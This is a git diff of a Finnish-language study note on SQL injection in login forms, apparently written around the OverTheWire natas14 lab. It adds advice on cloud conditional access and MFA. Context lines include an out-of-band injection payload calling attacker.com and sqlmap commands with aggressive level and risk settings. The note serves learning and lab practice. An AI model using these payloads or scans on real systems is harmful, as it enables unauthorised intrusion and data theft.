@@ -1,6 +1,8 @@
 # SQL injektio
 
-Tämä koskee siis periaatteessa normaalisti SQL (MySQL) tietokannan injektiota, jossa yritettään ratkaista ja päästä johonkin kirjauttumisen lomakkeesta sisään. Nykyään ja tulevaisuudessakin paljon kirjauttumisessa pyydettään syötä **username;password**. 
+Tämä koskee siis periaatteessa normaalisti SQL (MySQL) tietokannan injektiota, jossa yritettään ratkaista ja päästä johonkin kirjauttumisen lomakkeesta sisään. Nykyään ja tulevaisuudessakin paljon kirjauttumisessa pyydettään syötä **username;password**, mutta turvallisuuden kannalta on parasta käyttää Microsoft pilvipalvelua, että käyttää hyödyntäen pilvipalvelun *conditional access* - policy käytäntö asetusta, ja sieltä voi pakottaa käyttäjän asettamaan MFA. 
+
+Jos haluaisi tietokannan MySQL kautta integroida Microsoft pilveen niin se on toisenlainen mutka, se ei olennaisesti pysty vai pystyykö?
 
 Tämän kirjauttumisen tapahtuu usein siten, että se lähettää jos käyttäjnimi ja salasana täsmää niin se lähettää tarkistuksen sinne palvelmille, jossa verrataan tietokannan tallennetuihin tietoihin. Tämä mahdollistaa sen, että käyttäjät voivat kirjautua sisään omilla tunnuksillaan. Sekä tämän kirjauttumisen tapahtuu usein, kun se kirjauttumisen ohjelma on integroitu mm. *mongodb/phpmyadmin* tai muu tietokanta kaltaiseen ohjelman alle. 
 
@@ -86,7 +88,6 @@ Tätä ei suoriteta heti, vaan tallennetaan ensin ja suoritetaan myöhemmin tois
 8. Out-of-Band SQL Injection <br>
 Tämä vaatii erityisiä olosuhteita, ja SQL-injektio lähettää tiedon ulos järjestelmästä, esim. DNS-kyselynä: <br>
 ' OR LOAD_FILE('\\\\attacker.com\\file') -- 
-
 
 
 9. Using SQL Comments Smartly <br>
@@ -200,7 +201,7 @@ sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
   --level=5 --risk=3 --batch
 ```
 
-## Sqlmapa tuloksia
+## SQLmap tuloksia
 
 Sqlmap kertoo myös muitakin tuloksia ettei vain **"onko injektoitavissa"**.
 
@@ -218,7 +219,7 @@ Sqlmap kertoo myös muitakin tuloksia ettei vain **"onko injektoitavissa"**.
 | 🔹 **Palvelin**              | Näyttää usein web-palvelimen ja käyttöjärjestelmän tiedot (esim. Apache, Ubuntu).     |
 | 🔹 **WAF-tunnistus**         | Havaitsee, onko Web Application Firewall käytössä.                                    |
 
-
+---
 
 📋 Täydellinen SQLMap-tulostietojen yhteenvetotaulukko
 | Kategoria                | Mitä tietoa `sqlmap` voi löytää                                                                                     |
@@ -272,6 +273,7 @@ sqlmap -u "http://natas14.natas.labs.overthewire.org/index.php" \
 Useimmin alkaa pienestä levelistä, että normikäyttö (kevyt skannaus ja nopea testi), mutta aikooko mennä syvemmälle ja selvittelee sitä palvelinta sitten alkaa mennä raskaampaa tasoa.
 
 Esim. mennään kevyesti ja tällä komennolla: `sqlmap -u "http://example.com/page.php?id=1" --batch --level=1 --risk=1` 
+
 
 Alkutarkistuksena kantsii mennä oletuksena `--level=1` , ja `--risk=1` , että etsii perusinjektioa nopeasti. <br>
 Syvempään analyysiin (lisätasoa):
